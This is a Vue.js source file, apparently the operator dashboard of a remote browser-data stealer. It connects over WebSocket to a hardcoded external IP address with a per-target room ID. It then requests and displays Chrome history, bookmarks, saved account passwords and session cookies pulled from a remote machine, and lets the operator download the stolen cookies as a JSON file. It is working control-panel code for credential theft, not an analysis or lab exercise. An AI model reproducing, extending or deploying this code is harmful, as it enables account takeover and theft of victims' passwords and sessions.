<template>
  <div>
    <el-card class="box-card" style="min-height: 78vh">
      <div slot="header" class="clearfix">
        <div
          style="
            display: flex;
            justify-content: space-between;
            align-items: center;
          "
        >
          <div>
            <span>{{ titleList[SendData.operation] }}</span>
          </div>
          <div style="display: flex">
            <el-button
              style="padding: 3px 0; margin-right: 20px"
              type="text"
              @click="downloadCookie"
              v-if="SendData.operation == 'cookie'"
              >cookie下载
            </el-button>
            <el-button
              style="padding: 3px 0; margin-right: 20px"
              type="text"
              @click="loadData, $message.success('刷新成功')"
              >刷新数据
            </el-button>
            <div>
              <el-select
                v-model="SendData.operation"
                placeholder="请选择"
                @change="ChangeOption"
              >
                <el-option
                  v-for="item in browserOptions"
                  :key="item.value"
                  :label="item.label"
                  :value="item.value"
                >
                </el-option>
              </el-select>
            </div>
          </div>
        </div>
      </div>
      <div ref="fileManage" style="height: 60vh; overflow: auto">
        <div v-if="SendData.operation == 'all'">
          <el-collapse v-model="operation" accordion>
            <el-collapse-item title="Chorme历史记录" name="history">
              <history :tableData="tableData" />
            </el-collapse-item>
            <el-collapse-item title="Chorme书签" name="bookmarks">
              <bookmarks :bookmarksData="bookmarksData" />
            </el-collapse-item>
            <el-collapse-item title="Chorme存储的账号密码" name="password">
              <PASSWORD :passwordData="passwordData" />
            </el-collapse-item>
            <el-collapse-item title="Chorme存储的cookie" name="cookie">
              <COOKIE :cookieData="cookieData" />
            </el-collapse-item>
          </el-collapse>
        </div>
        <div v-else>
          <history
            v-if="SendData.operation == 'history'"
            :tableData="tableData"
          />
          <bookmarks
            v-if="SendData.operation == 'bookmarks'"
            :bookmarksData="bookmarksData"
          />
          <PASSWORD
            v-if="SendData.operation == 'password'"
            :passwordData="passwordData"
          />
          <COOKIE
            v-if="SendData.operation == 'cookie'"
            :cookieData="cookieData"
          />
        </div>
      </div>
    </el-card>
  </div>
</template>

<script>
import history from "./history.vue";
import bookmarks from "./bookmarks.vue";
import PASSWORD from "./password.vue";
import COOKIE from "./cookie.vue";
export default {
  name: "browser",
  components: {
    history,
    bookmarks,
    PASSWORD,
    COOKIE,
  },
  data() {
    return {
      socketURI: "",
      //历史记录
      tableData: [],
      //书签相关
      bookmarksData: [],
      //密码
      passwordData: [],
      //cookie
      cookieData: [],
      cookieContent: [],
      SendData: {
        operation: "history",
      },
      operation: "history",
      titleList: {
        history: "Chorme历史记录",
        bookmarks: "Chorme书签",
        password: "Chorme存储的账号密码",
        cookie: "Chorme存储的cookie",
      },
      browserOptions: [
        { label: "全部", value: "all" },
        { label: "书签", value: "bookmarks" },
        { label: "历史记录", value: "history" },
        { label: "存储的账号密码", value: "password" },
        { label: "cookie", value: "cookie" },
      ],
    };
  },
  created() {
    var room = this.$route.query.roomID;
    var ipaddr = localStorage.getItem("ipaddr")
      ? localStorage.getItem("ipaddr")
      : "101.34.204.112:7880";
    this.socketURI = `ws://${ipaddr}/browser?room=${room}`;
    this.initSocket();
  },

  methods: {
    /**
     * 书签
     */
    filterBookmarksData(rows) {
      var items = [];
      for (const row of rows) {
        if (row.type == "folder") {
          items.push({
            label: row.name,
            type: row.type,
            children: this.filterBookmarksData(row.children),
          });
        } else {
          items.push({
            label: row.name,
            url: row.url,
            type: row.type,
            ico: row.ico,
          });
        }
      }
      return items;
    },
    /**
     * cookie
     */
    downloadCookie() {
      var aTag = document.createElement("a");
      aTag.download = "cookie.json";
      const contentType = "text/plain;charset=utf-8";
      var blob = new Blob([JSON.stringify(this.cookieContent)], {
        type: contentType,
      });
      aTag.href = URL.createObjectURL(blob);
      aTag.click();
    },
    ChangeOption(e) {
      this.SendData.operation = e;
      this.socket.send(JSON.stringify(this.SendData));
      this.$refs.fileManage.scrollTop = 0;
    },
    loadData() {
      this.socket.send(JSON.stringify(this.SendData));
    },
    /**
     * socket相关操作
     */
    initSocket() {
      this.socket = new WebSocket(this.socketURI);
      this.socketOnOpen();
      this.socketOnMessage();
      this.socketOnError();
      this.socketOnClose();
    },

    socketOnOpen() {
      this.socket.onopen = () => {
        this.socket.send(JSON.stringify(this.SendData));
      };
    },
    socketOnMessage() {
      this.socket.onmessage = (msg) => {
        if (msg.data instanceof Blob) {
          const reader = new FileReader();
          reader.readAsText(msg.data, "UTF-8");
          reader.onload = (e) => {
            let result = reader.result;
            let res = JSON.parse(result);
            if (res.data instanceof String) {
              this.$message.error(res.data);
            } else {
              if (res.operation == "history") {
                this.tableData = res.data;
              } else if (res.operation == "bookmarks") {
                this.bookmarksData = this.filterBookmarksData(res.data);
              } else if (res.operation == "password") {
                this.passwordData = res.data;
              } else if (res.operation == "cookie") {
                res.data.sort(function (p1, p2) {
                  return p1.domain.localeCompare(p2.domain, "zh-CN"); //正序
                });
                this.cookieContent = res.data;
                this.cookieData = res.data.slice(0, 50);
              } else {
                this.tableData = res.data["history"];
                this.bookmarksData = this.filterBookmarksData(res.data["bookmarks"]);
                this.passwordData = res.data["password"];
                res.data["cookie"].sort(function (p1, p2) {
                  return p1.domain.localeCompare(p2.domain, "zh-CN"); //正序
                });
                this.cookieData = res.data["cookie"].slice(0, 50);
              }
            }
          };
        }
      };
    },
    socketOnClose() {
      this.socket.onclose = () => {
        console.log("close socket");
      };
    },
    socketOnError() {
      this.socket.onerror = () => {
        console.log("socket 链接失败");
      };
    },
  },
};
</script>

<style scoped>
::v-deep .el-range-separator {
  padding: 0px;
}
::v-deep .el-input__inner {
  border-radius: 0px;
}
::v-deep .el-table th > .cell {
  cursor: pointer;
}
::v-deep .el-table tr {
  cursor: pointer;
}
::v-deep .el-tree-node__content {
  height: auto;
}
.demo-table-expand {
  font-size: 0;
}
.demo-table-expand label {
  width: 90px;
  color: #99a9bf;
}
.demo-table-expand .el-form-item {
  margin-right: 0;
  margin-bottom: 0;
  width: 50%;
}
::v-deep .el-form-item__label {
  font-size: 18px;
}
.dialog-footer {
  display: flex;
  width: 100%;
  justify-content: flex-end;
}
</style>
